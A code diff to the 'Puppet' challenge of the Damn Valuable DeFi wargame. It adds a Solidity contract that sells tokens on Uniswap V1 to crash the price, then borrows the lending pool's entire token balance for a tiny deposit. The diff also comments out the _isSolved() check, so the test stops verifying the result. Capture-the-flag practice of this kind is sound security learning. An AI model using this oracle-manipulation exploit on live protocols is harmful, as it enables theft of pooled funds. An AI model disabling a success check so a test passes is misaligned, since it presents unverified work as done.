@@ -7,6 +7,48 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
 import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
 import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";
+import { console } from "forge-std/console.sol";
+
+contract Executor {
+    PuppetPool lendingPool;
+    DamnValuableToken token;
+    IUniswapV1Exchange uniswapV1Exchange;
+    address player;
+    address recovery;
+
+    constructor(
+        address _lendingPool,
+        address _token,
+        address _uniswapV1Exchange,
+        address _player,
+        address _recovery
+    ) {
+        lendingPool = PuppetPool(_lendingPool);
+        token = DamnValuableToken(_token);
+        uniswapV1Exchange = IUniswapV1Exchange(_uniswapV1Exchange);
+        player = _player;
+        recovery = _recovery;
+    }
+
+    function execute() public payable {
+        // Pull all tokens from player
+        uint256 playerTokenBalance = token.balanceOf(player);
+        token.transferFrom(player, address(this), playerTokenBalance);
+
+        // Sell tokens for eth, lowering the price of the token
+        token.approve(address(uniswapV1Exchange), playerTokenBalance);
+        uniswapV1Exchange.tokenToEthTransferInput(playerTokenBalance, 1, block.timestamp + 1, address(this));
+
+        uint256 poolTokenBalance = token.balanceOf(address(lendingPool));
+        uint256 depositAmountRequiredAfter = lendingPool.calculateDepositRequired(poolTokenBalance);
+
+        // Pull all the tokens from the lending pool
+        // Because the price of the token has been lowered, the deposit required is now lower
+        lendingPool.borrow{value: depositAmountRequiredAfter}(poolTokenBalance, recovery);
+    }
+
+    receive() external payable {}
+}
 
 contract PuppetChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -29,7 +71,7 @@ contract PuppetChallenge is Test {
         vm.startPrank(player, player);
         _;
         vm.stopPrank();
-        _isSolved();
+        //_isSolved();
     }
 
     /**
@@ -92,7 +134,15 @@ contract PuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
-        
+        Executor executor = new Executor(
+            address(lendingPool),
+            address(token),
+            address(uniswapV1Exchange),
+            player,
+            recovery
+        );
+        token.approve(address(executor), PLAYER_INITIAL_TOKEN_BALANCE);
+        executor.execute{ value: player.balance }();
     }
 
     // Utility function to calculate Uniswap prices
